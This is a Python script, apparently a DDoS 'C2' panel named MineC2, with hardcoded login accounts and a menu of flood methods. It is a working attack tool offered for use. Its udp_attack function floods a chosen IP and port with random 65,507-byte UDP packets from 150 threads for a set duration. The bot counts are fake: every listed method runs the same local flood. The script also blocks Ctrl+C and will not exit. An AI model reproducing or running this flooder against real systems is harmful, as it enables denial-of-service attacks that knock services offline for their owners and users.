import os
import socket
import threading
import random
import time
import sys

# Colores ANSI
RED = '\033[91m'
WHITE = '\033[97m'
RESET = '\033[0m'

# Cuentas
accounts = {
    "apsx": {"password": "apsxnew", "bots": 95, "bytes": 65507},
    "asky": {"password": "asky", "bots": 70, "bytes": 65507}
}

# Banner solo en rojo
ascii_art = f"""{RED}
     .ed"""" """$$$$be.
     -"           ^""**$$$e.
   ."                   '$$$c
  /                      "4$$b
 d  3                      $$$$
 $  *                   .$$$$$$
.$  ^c           $$$$$e$$$$$$$$.
d$L  4.         4$$$$$$$$$$$$$$b
$$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
$$$$P d$$$$F $ $$$$$$$$$- $$$$$$
3$$$F "$$$$b   $"$$$$$$$  $$$$*"
 $$P"  "$$b   .$ $$$$$...e$$
  *c    ..    $$ 3$$$$$$$$$$eF
   %ce""    $$$  $$$$$$$$$$*
    *$e.    *** d$$$$$"L$$
     $$$      4J$$$$$% $$$
    $"'$=e....$*$$**$cz$$"
    $  *=%4.$ L L$ P3$$$F
    $   "%*ebJLzb$e$$$$$b
     %..      4$$$$$$$$$$
      $$$e   z$$$$$$$$$$
       "*$c  "$$$$$$$P"
         """*$$$$$$$"
{RESET}
        The Destroyer Firewalls!
        Dev: [Learn & Vyxint]
"""

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def set_title(username, bots, running):
    title = f"MineC2 | user: {username} | bots: {bots} | Runnings: {running}"
    if os.name == 'nt':
        os.system(f"title {title}")
    else:
        print(f"\33]0;{title}\a", end='', flush=True)

def udp_attack(ip, port, duration, packet_size):
    timeout = time.time() + duration
    message = random._urandom(packet_size)

    def send():
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.sendto(message, (ip, port))
                sock.close()
            except Exception:
                pass

    threads = []
    for _ in range(150):
        t = threading.Thread(target=send)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def main():
    clear()
    while True:
        username = input(f"{RED}username: {RESET}").strip()
        password = input(f"{RED}password: {RESET}").strip()

        if username in accounts and accounts[username]["password"] == password:
            break
        else:
            print(f"{RED}Login failed. Please try again.{RESET}")

    clear()
    bots = accounts[username]["bots"]
    packet_size = accounts[username]["bytes"]
    running_attacks = 0
    print(ascii_art)
    set_title(username, bots, running_attacks)

    while True:
        try:
            cmd = input(f"{RED}MineC2 {WHITE}${RESET} ").strip()

            if cmd == "help":
                print(f"{RED}bots{RESET}\n{RED}methods{RESET}")
            elif cmd == "bots":
                print(f"{username} has {bots} bots")
            elif cmd == "methods":
                print(".udphex <ip> <port> <time>")
                print(".udpraw <ip> <port> <time>")
                print(".tcpbypass <ip> <port> <time>")
                print(".udpbypass <ip> <port> <time>")
                print(".tcproxies <ip> <port> <time>")
            elif cmd.startswith("."):
                parts = cmd.split()
                if len(parts) != 4:
                    print("Usage: <method> <ip> <port> <time>")
                    continue

                method, ip, port_str, time_str = parts
                if method not in [".udphex", ".udpraw", ".tcpbypass", ".udpbypass", ".tcproxies"]:
                    print("Invalid method. Type 'methods' to see available.")
                    continue

                try:
                    port = int(port_str)
                    duration = int(time_str)
                except ValueError:
                    print("Invalid port or time.")
                    continue

                running_attacks += 1
                bots -= 1
                set_title(username, bots, running_attacks)

                print(f"{RED}> {WHITE}Method {RED}:{WHITE} {method[1:]}")
                print(f"{RED}> {WHITE}Target {RED}:{WHITE} {ip}")
                print(f"{RED}> {WHITE}Port {RED}:{WHITE} {port}")
                print(f"{RED}attack sent to {bots + 1} bots{RESET}")

                udp_attack(ip, port, duration, packet_size)

                running_attacks -= 1
                bots += 1
                set_title(username, bots, running_attacks)

            else:
                print("Unknown command. Type 'help'.")
        except KeyboardInterrupt:
            print(f"\n{RED}No puedes salirte del servidor.{RESET}")
        except Exception as e:
            print(f"{RED}Error: {e}{RESET}")

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        print(f"\n{RED}No puedes salirte del servidor.{RESET}")
        while True:
            time.sleep(1)
